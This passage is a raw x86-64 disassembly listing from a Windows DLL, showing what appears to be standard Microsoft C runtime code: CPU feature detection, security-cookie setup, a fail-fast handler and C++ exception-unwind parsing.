   1800024a3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800024a8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1800024ad:	33 c9                	xor    %ecx,%ecx
   1800024af:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800024b4:	ff 15 76 db 00 00    	call   *0xdb76(%rip)        # 0x180010030
   1800024ba:	ff c7                	inc    %edi
   1800024bc:	83 ff 02             	cmp    $0x2,%edi
   1800024bf:	7c b1                	jl     0x180002472
   1800024c1:	48 83 c4 40          	add    $0x40,%rsp
   1800024c5:	5f                   	pop    %rdi
   1800024c6:	5e                   	pop    %rsi
   1800024c7:	5b                   	pop    %rbx
   1800024c8:	c3                   	ret
   1800024c9:	cc                   	int3
   1800024ca:	cc                   	int3
   1800024cb:	cc                   	int3
   1800024cc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800024d1:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800024d6:	57                   	push   %rdi
   1800024d7:	48 83 ec 10          	sub    $0x10,%rsp
   1800024db:	33 c0                	xor    %eax,%eax
   1800024dd:	33 c9                	xor    %ecx,%ecx
   1800024df:	0f a2                	cpuid
   1800024e1:	44 8b c1             	mov    %ecx,%r8d
   1800024e4:	45 33 db             	xor    %r11d,%r11d
   1800024e7:	44 8b cb             	mov    %ebx,%r9d
   1800024ea:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   1800024f1:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   1800024f8:	44 8b d2             	mov    %edx,%r10d
   1800024fb:	8b f0                	mov    %eax,%esi
   1800024fd:	33 c9                	xor    %ecx,%ecx
   1800024ff:	41 8d 43 01          	lea    0x1(%r11),%eax
   180002503:	45 0b c8             	or     %r8d,%r9d
   180002506:	0f a2                	cpuid
   180002508:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   18000250f:	89 04 24             	mov    %eax,(%rsp)
   180002512:	45 0b ca             	or     %r10d,%r9d
   180002515:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180002519:	8b f9                	mov    %ecx,%edi
   18000251b:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000251f:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   180002523:	75 50                	jne    0x180002575
   180002525:	48 83 0d f3 7a 01 00 	orq    $0xffffffffffffffff,0x17af3(%rip)        # 0x18001a020
   18000252c:	ff 
   18000252d:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   180002532:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   180002537:	74 28                	je     0x180002561
   180002539:	3d 60 06 02 00       	cmp    $0x20660,%eax
   18000253e:	74 21                	je     0x180002561
   180002540:	3d 70 06 02 00       	cmp    $0x20670,%eax
   180002545:	74 1a                	je     0x180002561
   180002547:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   18000254c:	83 f8 20             	cmp    $0x20,%eax
   18000254f:	77 24                	ja     0x180002575
   180002551:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180002558:	00 00 00 
   18000255b:	48 0f a3 c1          	bt     %rax,%rcx
   18000255f:	73 14                	jae    0x180002575
   180002561:	44 8b 05 58 8b 01 00 	mov    0x18b58(%rip),%r8d        # 0x18001b0c0
   180002568:	41 83 c8 01          	or     $0x1,%r8d
   18000256c:	44 89 05 4d 8b 01 00 	mov    %r8d,0x18b4d(%rip)        # 0x18001b0c0
   180002573:	eb 07                	jmp    0x18000257c
   180002575:	44 8b 05 44 8b 01 00 	mov    0x18b44(%rip),%r8d        # 0x18001b0c0
   18000257c:	b8 07 00 00 00       	mov    $0x7,%eax
   180002581:	44 8d 48 fb          	lea    -0x5(%rax),%r9d
   180002585:	3b f0                	cmp    %eax,%esi
   180002587:	7c 26                	jl     0x1800025af
   180002589:	33 c9                	xor    %ecx,%ecx
   18000258b:	0f a2                	cpuid
   18000258d:	89 04 24             	mov    %eax,(%rsp)
   180002590:	44 8b db             	mov    %ebx,%r11d
   180002593:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180002597:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000259b:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   18000259f:	0f ba e3 09          	bt     $0x9,%ebx
   1800025a3:	73 0a                	jae    0x1800025af
   1800025a5:	45 0b c1             	or     %r9d,%r8d
   1800025a8:	44 89 05 11 8b 01 00 	mov    %r8d,0x18b11(%rip)        # 0x18001b0c0
   1800025af:	c7 05 5f 7a 01 00 01 	movl   $0x1,0x17a5f(%rip)        # 0x18001a018
   1800025b6:	00 00 00 
   1800025b9:	44 89 0d 5c 7a 01 00 	mov    %r9d,0x17a5c(%rip)        # 0x18001a01c
   1800025c0:	0f ba e7 14          	bt     $0x14,%edi
   1800025c4:	0f 83 91 00 00 00    	jae    0x18000265b
   1800025ca:	44 89 0d 47 7a 01 00 	mov    %r9d,0x17a47(%rip)        # 0x18001a018
   1800025d1:	bb 06 00 00 00       	mov    $0x6,%ebx
   1800025d6:	89 1d 40 7a 01 00    	mov    %ebx,0x17a40(%rip)        # 0x18001a01c
   1800025dc:	0f ba e7 1b          	bt     $0x1b,%edi
   1800025e0:	73 79                	jae    0x18000265b
   1800025e2:	0f ba e7 1c          	bt     $0x1c,%edi
   1800025e6:	73 73                	jae    0x18000265b
   1800025e8:	33 c9                	xor    %ecx,%ecx
   1800025ea:	0f 01 d0             	xgetbv
   1800025ed:	48 c1 e2 20          	shl    $0x20,%rdx
   1800025f1:	48 0b d0             	or     %rax,%rdx
   1800025f4:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1800025f9:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1800025fe:	22 c3                	and    %bl,%al
   180002600:	3a c3                	cmp    %bl,%al
   180002602:	75 57                	jne    0x18000265b
   180002604:	8b 05 12 7a 01 00    	mov    0x17a12(%rip),%eax        # 0x18001a01c
   18000260a:	83 c8 08             	or     $0x8,%eax
   18000260d:	c7 05 01 7a 01 00 03 	movl   $0x3,0x17a01(%rip)        # 0x18001a018
   180002614:	00 00 00 
   180002617:	89 05 ff 79 01 00    	mov    %eax,0x179ff(%rip)        # 0x18001a01c
   18000261d:	41 f6 c3 20          	test   $0x20,%r11b
   180002621:	74 38                	je     0x18000265b
   180002623:	83 c8 20             	or     $0x20,%eax
   180002626:	c7 05 e8 79 01 00 05 	movl   $0x5,0x179e8(%rip)        # 0x18001a018
   18000262d:	00 00 00 
   180002630:	89 05 e6 79 01 00    	mov    %eax,0x179e6(%rip)        # 0x18001a01c
   180002636:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
   18000263b:	44 23 d8             	and    %eax,%r11d
   18000263e:	44 3b d8             	cmp    %eax,%r11d
   180002641:	75 18                	jne    0x18000265b
   180002643:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180002648:	24 e0                	and    $0xe0,%al
   18000264a:	3c e0                	cmp    $0xe0,%al
   18000264c:	75 0d                	jne    0x18000265b
   18000264e:	83 0d c7 79 01 00 40 	orl    $0x40,0x179c7(%rip)        # 0x18001a01c
   180002655:	89 1d bd 79 01 00    	mov    %ebx,0x179bd(%rip)        # 0x18001a018
   18000265b:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   180002660:	33 c0                	xor    %eax,%eax
   180002662:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   180002667:	48 83 c4 10          	add    $0x10,%rsp
   18000266b:	5f                   	pop    %rdi
   18000266c:	c3                   	ret
   18000266d:	cc                   	int3
   18000266e:	cc                   	int3
   18000266f:	cc                   	int3
   180002670:	33 c0                	xor    %eax,%eax
   180002672:	39 05 60 96 01 00    	cmp    %eax,0x19660(%rip)        # 0x18001bcd8
   180002678:	0f 95 c0             	setne  %al
   18000267b:	c3                   	ret
   18000267c:	83 25 41 8a 01 00 00 	andl   $0x0,0x18a41(%rip)        # 0x18001b0c4
   180002683:	c3                   	ret
   180002684:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002689:	55                   	push   %rbp
   18000268a:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   180002691:	ff 
   180002692:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   180002699:	8b d9                	mov    %ecx,%ebx
   18000269b:	b9 17 00 00 00       	mov    $0x17,%ecx
   1800026a0:	ff 15 b2 d9 00 00    	call   *0xd9b2(%rip)        # 0x180010058
   1800026a6:	85 c0                	test   %eax,%eax
   1800026a8:	74 04                	je     0x1800026ae
   1800026aa:	8b cb                	mov    %ebx,%ecx
   1800026ac:	cd 29                	int    $0x29
   1800026ae:	b9 03 00 00 00       	mov    $0x3,%ecx
   1800026b3:	e8 c4 ff ff ff       	call   0x18000267c
   1800026b8:	33 d2                	xor    %edx,%edx
   1800026ba:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800026be:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1800026c4:	e8 b7 0f 00 00       	call   0x180003680
   1800026c9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800026cd:	ff 15 4d d9 00 00    	call   *0xd94d(%rip)        # 0x180010020
   1800026d3:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   1800026da:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   1800026e1:	48 8b cb             	mov    %rbx,%rcx
   1800026e4:	45 33 c0             	xor    %r8d,%r8d
   1800026e7:	ff 15 3b d9 00 00    	call   *0xd93b(%rip)        # 0x180010028
   1800026ed:	48 85 c0             	test   %rax,%rax
   1800026f0:	74 3c                	je     0x18000272e
   1800026f2:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1800026f8:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   1800026ff:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   180002706:	4c 8b c8             	mov    %rax,%r9
   180002709:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   18000270e:	4c 8b c3             	mov    %rbx,%r8
   180002711:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   180002718:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   18000271d:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002721:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180002726:	33 c9                	xor    %ecx,%ecx
   180002728:	ff 15 02 d9 00 00    	call   *0xd902(%rip)        # 0x180010030
   18000272e:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180002735:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000273a:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   180002741:	33 d2                	xor    %edx,%edx
   180002743:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   18000274a:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   180002750:	48 83 c0 08          	add    $0x8,%rax
   180002754:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   18000275b:	e8 20 0f 00 00       	call   0x180003680
   180002760:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180002767:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   18000276c:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   180002773:	40 
   180002774:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   18000277b:	00 
   18000277c:	ff 15 de d8 00 00    	call   *0xd8de(%rip)        # 0x180010060
   180002782:	83 f8 01             	cmp    $0x1,%eax
   180002785:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   18000278a:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   18000278f:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180002793:	0f 94 c3             	sete   %bl
   180002796:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   18000279b:	33 c9                	xor    %ecx,%ecx
   18000279d:	ff 15 9d d8 00 00    	call   *0xd89d(%rip)        # 0x180010040
   1800027a3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800027a8:	ff 15 8a d8 00 00    	call   *0xd88a(%rip)        # 0x180010038
   1800027ae:	85 c0                	test   %eax,%eax
   1800027b0:	75 0c                	jne    0x1800027be
   1800027b2:	84 db                	test   %bl,%bl
   1800027b4:	75 08                	jne    0x1800027be
   1800027b6:	8d 48 03             	lea    0x3(%rax),%ecx
   1800027b9:	e8 be fe ff ff       	call   0x18000267c
   1800027be:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   1800027c5:	00 
   1800027c6:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   1800027cd:	5d                   	pop    %rbp
   1800027ce:	c3                   	ret
   1800027cf:	cc                   	int3
   1800027d0:	c2 00 00             	ret    $0x0
   1800027d3:	cc                   	int3
   1800027d4:	e9 e7 4f 00 00       	jmp    0x1800077c0
   1800027d9:	cc                   	int3
   1800027da:	cc                   	int3
   1800027db:	cc                   	int3
   1800027dc:	48 83 ec 48          	sub    $0x48,%rsp
   1800027e0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800027e5:	e8 be f1 ff ff       	call   0x1800019a8
   1800027ea:	48 8d 15 cf 67 01 00 	lea    0x167cf(%rip),%rdx        # 0x180018fc0
   1800027f1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800027f6:	e8 25 0b 00 00       	call   0x180003320
   1800027fb:	cc                   	int3
   1800027fc:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002801:	55                   	push   %rbp
   180002802:	48 8b ec             	mov    %rsp,%rbp
   180002805:	48 83 ec 20          	sub    $0x20,%rsp
   180002809:	48 8b 05 00 78 01 00 	mov    0x17800(%rip),%rax        # 0x18001a010
   180002810:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   180002817:	2b 00 00 
   18000281a:	48 3b c3             	cmp    %rbx,%rax
   18000281d:	75 74                	jne    0x180002893
   18000281f:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   180002824:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180002828:	ff 15 62 d8 00 00    	call   *0xd862(%rip)        # 0x180010090
   18000282e:	48 8b 45 18          	mov    0x18(%rbp),%rax
   180002832:	48 89 45 10          	mov    %rax,0x10(%rbp)
   180002836:	ff 15 4c d8 00 00    	call   *0xd84c(%rip)        # 0x180010088
   18000283c:	8b c0                	mov    %eax,%eax
   18000283e:	48 31 45 10          	xor    %rax,0x10(%rbp)
   180002842:	ff 15 38 d8 00 00    	call   *0xd838(%rip)        # 0x180010080
   180002848:	8b c0                	mov    %eax,%eax
   18000284a:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   18000284e:	48 31 45 10          	xor    %rax,0x10(%rbp)
   180002852:	ff 15 20 d8 00 00    	call   *0xd820(%rip)        # 0x180010078
   180002858:	8b 45 20             	mov    0x20(%rbp),%eax
   18000285b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   18000285f:	48 c1 e0 20          	shl    $0x20,%rax
   180002863:	48 33 45 20          	xor    0x20(%rbp),%rax
   180002867:	48 33 45 10          	xor    0x10(%rbp),%rax
   18000286b:	48 33 c1             	xor    %rcx,%rax
   18000286e:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   180002875:	ff 00 00 
   180002878:	48 23 c1             	and    %rcx,%rax
   18000287b:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   180002882:	2b 00 00 
   180002885:	48 3b c3             	cmp    %rbx,%rax
   180002888:	48 0f 44 c1          	cmove  %rcx,%rax
   18000288c:	48 89 05 7d 77 01 00 	mov    %rax,0x1777d(%rip)        # 0x18001a010
   180002893:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180002898:	48 f7 d0             	not    %rax
   18000289b:	48 89 05 66 77 01 00 	mov    %rax,0x17766(%rip)        # 0x18001a008
   1800028a2:	48 83 c4 20          	add    $0x20,%rsp
   1800028a6:	5d                   	pop    %rbp
   1800028a7:	c3                   	ret
   1800028a8:	48 8d 0d 21 88 01 00 	lea    0x18821(%rip),%rcx        # 0x18001b0d0
   1800028af:	48 ff 25 e2 d7 00 00 	rex.W jmp *0xd7e2(%rip)        # 0x180010098
   1800028b6:	cc                   	int3
   1800028b7:	cc                   	int3
   1800028b8:	48 8d 0d 11 88 01 00 	lea    0x18811(%rip),%rcx        # 0x18001b0d0
   1800028bf:	e9 74 0f 00 00       	jmp    0x180003838
   1800028c4:	48 8d 05 15 88 01 00 	lea    0x18815(%rip),%rax        # 0x18001b0e0
   1800028cb:	c3                   	ret
   1800028cc:	48 8d 05 15 88 01 00 	lea    0x18815(%rip),%rax        # 0x18001b0e8
   1800028d3:	c3                   	ret
   1800028d4:	48 83 ec 28          	sub    $0x28,%rsp
   1800028d8:	e8 e7 ff ff ff       	call   0x1800028c4
   1800028dd:	48 83 08 24          	orq    $0x24,(%rax)
   1800028e1:	e8 e6 ff ff ff       	call   0x1800028cc
   1800028e6:	48 83 08 02          	orq    $0x2,(%rax)
   1800028ea:	48 83 c4 28          	add    $0x28,%rsp
   1800028ee:	c3                   	ret
   1800028ef:	cc                   	int3
   1800028f0:	48 8d 05 d9 93 01 00 	lea    0x193d9(%rip),%rax        # 0x18001bcd0
   1800028f7:	c3                   	ret
   1800028f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800028fd:	57                   	push   %rdi
   1800028fe:	48 83 ec 20          	sub    $0x20,%rsp
   180002902:	48 8d 1d 17 58 01 00 	lea    0x15817(%rip),%rbx        # 0x180018120
   180002909:	48 8d 3d 10 58 01 00 	lea    0x15810(%rip),%rdi        # 0x180018120
   180002910:	eb 12                	jmp    0x180002924
   180002912:	48 8b 03             	mov    (%rbx),%rax
   180002915:	48 85 c0             	test   %rax,%rax
   180002918:	74 06                	je     0x180002920
   18000291a:	ff 15 48 d9 00 00    	call   *0xd948(%rip)        # 0x180010268
   180002920:	48 83 c3 08          	add    $0x8,%rbx
   180002924:	48 3b df             	cmp    %rdi,%rbx
   180002927:	72 e9                	jb     0x180002912
   180002929:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000292e:	48 83 c4 20          	add    $0x20,%rsp
   180002932:	5f                   	pop    %rdi
   180002933:	c3                   	ret
   180002934:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002939:	57                   	push   %rdi
   18000293a:	48 83 ec 20          	sub    $0x20,%rsp
   18000293e:	48 8d 1d eb 57 01 00 	lea    0x157eb(%rip),%rbx        # 0x180018130
   180002945:	48 8d 3d e4 57 01 00 	lea    0x157e4(%rip),%rdi        # 0x180018130
   18000294c:	eb 12                	jmp    0x180002960
   18000294e:	48 8b 03             	mov    (%rbx),%rax
   180002951:	48 85 c0             	test   %rax,%rax
   180002954:	74 06                	je     0x18000295c
   180002956:	ff 15 0c d9 00 00    	call   *0xd90c(%rip)        # 0x180010268
   18000295c:	48 83 c3 08          	add    $0x8,%rbx
   180002960:	48 3b df             	cmp    %rdi,%rbx
   180002963:	72 e9                	jb     0x18000294e
   180002965:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000296a:	48 83 c4 20          	add    $0x20,%rsp
   18000296e:	5f                   	pop    %rdi
   18000296f:	c3                   	ret
   180002970:	48 8b c4             	mov    %rsp,%rax
   180002973:	4c 89 48 20          	mov    %r9,0x20(%rax)
   180002977:	4c 89 40 18          	mov    %r8,0x18(%rax)
   18000297b:	48 89 50 10          	mov    %rdx,0x10(%rax)
   18000297f:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180002983:	53                   	push   %rbx
   180002984:	48 83 ec 70          	sub    $0x70,%rsp
   180002988:	48 8b d9             	mov    %rcx,%rbx
   18000298b:	83 60 c8 00          	andl   $0x0,-0x38(%rax)
   18000298f:	48 89 48 e0          	mov    %rcx,-0x20(%rax)
   180002993:	4c 89 40 e8          	mov    %r8,-0x18(%rax)
   180002997:	e8 38 0f 00 00       	call   0x1800038d4
   18000299c:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1800029a1:	8b 0b                	mov    (%rbx),%ecx
   1800029a3:	48 8b 40 10          	mov    0x10(%rax),%rax
   1800029a7:	ff 15 bb d8 00 00    	call   *0xd8bb(%rip)        # 0x180010268
   1800029ad:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   1800029b4:	00 
   1800029b5:	eb 00                	jmp    0x1800029b7
   1800029b7:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1800029bb:	48 83 c4 70          	add    $0x70,%rsp
   1800029bf:	5b                   	pop    %rbx
   1800029c0:	c3                   	ret
   1800029c1:	cc                   	int3
   1800029c2:	cc                   	int3
   1800029c3:	cc                   	int3
   1800029c4:	48 8b c4             	mov    %rsp,%rax
   1800029c7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1800029cb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1800029cf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1800029d3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800029d7:	41 56                	push   %r14
   1800029d9:	8a 19                	mov    (%rcx),%bl
   1800029db:	4c 8d 51 01          	lea    0x1(%rcx),%r10
   1800029df:	88 1a                	mov    %bl,(%rdx)
   1800029e1:	41 8b f1             	mov    %r9d,%esi
   1800029e4:	4c 8d 35 15 d6 ff ff 	lea    -0x29eb(%rip),%r14        # 0x180000000
   1800029eb:	49 8b e8             	mov    %r8,%rbp
   1800029ee:	4c 8b da             	mov    %rdx,%r11
   1800029f1:	48 8b f9             	mov    %rcx,%rdi
   1800029f4:	f6 c3 04             	test   $0x4,%bl
   1800029f7:	74 24                	je     0x180002a1d
   1800029f9:	41 0f b6 0a          	movzbl (%r10),%ecx
   1800029fd:	83 e1 0f             	and    $0xf,%ecx
   180002a00:	4a 0f be 84 31 c0 03 	movsbq 0x103c0(%rcx,%r14,1),%rax
   180002a07:	01 00 
   180002a09:	42 8a 8c 31 d0 03 01 	mov    0x103d0(%rcx,%r14,1),%cl
   180002a10:	00 
   180002a11:	4c 2b d0             	sub    %rax,%r10
   180002a14:	41 8b 42 fc          	mov    -0x4(%r10),%eax
   180002a18:	d3 e8                	shr    %cl,%eax
   180002a1a:	89 42 04             	mov    %eax,0x4(%rdx)
   180002a1d:	f6 c3 08             	test   $0x8,%bl
   180002a20:	74 0a                	je     0x180002a2c
   180002a22:	41 8b 02             	mov    (%r10),%eax
   180002a25:	49 83 c2 04          	add    $0x4,%r10
   180002a29:	89 42 08             	mov    %eax,0x8(%rdx)
   180002a2c:	f6 c3 10             	test   $0x10,%bl
   180002a2f:	74 0a                	je     0x180002a3b
   180002a31:	41 8b 02             	mov    (%r10),%eax
   180002a34:	49 83 c2 04          	add    $0x4,%r10
   180002a38:	89 42 0c             	mov    %eax,0xc(%rdx)
   180002a3b:	49 63 02             	movslq (%r10),%rax
   180002a3e:	4d 8d 42 04          	lea    0x4(%r10),%r8
   180002a42:	45 33 c9             	xor    %r9d,%r9d
   180002a45:	44 38 4c 24 30       	cmp    %r9b,0x30(%rsp)
   180002a4a:	75 50                	jne    0x180002a9c
   180002a4c:	f6 c3 02             	test   $0x2,%bl
   180002a4f:	74 4b                	je     0x180002a9c
   180002a51:	48 8d 14 28          	lea    (%rax,%rbp,1),%rdx
   180002a55:	0f b6 0a             	movzbl (%rdx),%ecx
   180002a58:	83 e1 0f             	and    $0xf,%ecx
   180002a5b:	4a 0f be 84 31 c0 03 	movsbq 0x103c0(%rcx,%r14,1),%rax
   180002a62:	01 00 
   180002a64:	42 8a 8c 31 d0 03 01 	mov    0x103d0(%rcx,%r14,1),%cl
   180002a6b:	00 
   180002a6c:	48 2b d0             	sub    %rax,%rdx
   180002a6f:	44 8b 52 fc          	mov    -0x4(%rdx),%r10d
   180002a73:	41 d3 ea             	shr    %cl,%r10d
   180002a76:	45 89 4b 10          	mov    %r9d,0x10(%r11)
   180002a7a:	45 85 d2             	test   %r10d,%r10d
   180002a7d:	74 20                	je     0x180002a9f
   180002a7f:	8b 02                	mov    (%rdx),%eax
   180002a81:	8b 4a 04             	mov    0x4(%rdx),%ecx
   180002a84:	48 8d 52 08          	lea    0x8(%rdx),%rdx
   180002a88:	3b c6                	cmp    %esi,%eax
   180002a8a:	74 0a                	je     0x180002a96
   180002a8c:	41 ff c1             	inc    %r9d
   180002a8f:	45 3b ca             	cmp    %r10d,%r9d
   180002a92:	72 eb                	jb     0x180002a7f
   180002a94:	eb 09                	jmp    0x180002a9f
   180002a96:	41 89 4b 10          	mov    %ecx,0x10(%r11)
   180002a9a:	eb 03                	jmp    0x180002a9f
   180002a9c:	89 42 10             	mov    %eax,0x10(%rdx)
   180002a9f:	f6 c3 01             	test   $0x1,%bl
   180002aa2:	74 25                	je     0x180002ac9
   180002aa4:	41 0f b6 08          	movzbl (%r8),%ecx
   180002aa8:	83 e1 0f             	and    $0xf,%ecx
   180002aab:	4a 0f be 94 31 c0 03 	movsbq 0x103c0(%rcx,%r14,1),%rdx
   180002ab2:	01 00 
   180002ab4:	42 8a 8c 31 d0 03 01 	mov    0x103d0(%rcx,%r14,1),%cl
   180002abb:	00 
   180002abc:	4c 2b c2             	sub    %rdx,%r8
   180002abf:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   180002ac3:	d3 ea                	shr    %cl,%edx
   180002ac5:	41 89 53 14          	mov    %edx,0x14(%r11)
   180002ac9:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   180002ace:	4c 2b c7             	sub    %rdi,%r8
   180002ad1:	48 8b 6c 24 18       	mov    0x18(%rsp),%rbp
   180002ad6:	49 8b c0             	mov    %r8,%rax
   180002ad9:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   180002ade:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   180002ae3:	41 5e                	pop    %r14
   180002ae5:	c3                   	ret
   180002ae6:	cc                   	int3
   180002ae7:	cc                   	int3
   180002ae8:	8a 02                	mov    (%rdx),%al
   180002aea:	24 01                	and    $0x1,%al
   180002aec:	c3                   	ret
   180002aed:	cc                   	int3
   180002aee:	cc                   	int3
   180002aef:	cc                   	int3
   180002af0:	48 83 ec 28          	sub    $0x28,%rsp
   180002af4:	41 f6 00 01          	testb  $0x1,(%r8)
   180002af8:	48 8b 09             	mov    (%rcx),%rcx
   180002afb:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002b00:	74 0d                	je     0x180002b0f
   180002b02:	41 8b 40 14          	mov    0x14(%r8),%eax
   180002b06:	48 8b 0c 08          	mov    (%rax,%rcx,1),%rcx
   180002b0a:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002b0f:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180002b13:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002b18:	e8 cf 26 00 00       	call   0x1800051ec
   180002b1d:	48 83 c4 28          	add    $0x28,%rsp
   180002b21:	c3                   	ret
   180002b22:	cc                   	int3
   180002b23:	cc                   	int3
   180002b24:	48 8b 01             	mov    (%rcx),%rax
   180002b27:	48 8b d1             	mov    %rcx,%rdx
   180002b2a:	49 89 01             	mov    %rax,(%r9)
   180002b2d:	41 f6 00 01          	testb  $0x1,(%r8)
   180002b31:	74 0e                	je     0x180002b41
   180002b33:	41 8b 48 14          	mov    0x14(%r8),%ecx
   180002b37:	48 8b 02             	mov    (%rdx),%rax
   180002b3a:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   180002b3e:	49 89 09             	mov    %rcx,(%r9)
   180002b41:	49 8b c1             	mov    %r9,%rax
   180002b44:	c3                   	ret
   180002b45:	cc                   	int3
   180002b46:	cc                   	int3
   180002b47:	cc                   	int3
   180002b48:	48 8b c4             	mov    %rsp,%rax
   180002b4b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180002b4f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180002b53:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180002b57:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180002b5b:	41 56                	push   %r14
   180002b5d:	48 83 ec 60          	sub    $0x60,%rsp
   180002b61:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   180002b66:	48 8b da             	mov    %rdx,%rbx
   180002b69:	0f 29 70 e8          	movaps %xmm6,-0x18(%rax)
   180002b6d:	48 8b e9             	mov    %rcx,%rbp
   180002b70:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   180002b75:	33 ff                	xor    %edi,%edi
   180002b77:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180002b7b:	48 8d 50 d8          	lea    -0x28(%rax),%rdx
   180002b7f:	0f 28 74 24 20       	movaps 0x20(%rsp),%xmm6
   180002b84:	48 8b cb             	mov    %rbx,%rcx
   180002b87:	66 0f 7f 70 d8       	movdqa %xmm6,-0x28(%rax)
   180002b8c:	45 8b f0             	mov    %r8d,%r14d
   180002b8f:	33 f6                	xor    %esi,%esi
   180002b91:	e8 3a 02 00 00       	call   0x180002dd0
   180002b96:	44 8b 0b             	mov    (%rbx),%r9d
   180002b99:	45 33 c0             	xor    %r8d,%r8d
   180002b9c:	45 85 c9             	test   %r9d,%r9d
   180002b9f:	0f 84 be 00 00 00    	je     0x180002c63
   180002ba5:	4c 8d 15 54 d4 ff ff 	lea    -0x2bac(%rip),%r10        # 0x180000000
   180002bac:	48 8b 43 18          	mov    0x18(%rbx),%rax
   180002bb0:	8b cf                	mov    %edi,%ecx
   180002bb2:	44 3b f0             	cmp    %eax,%r14d
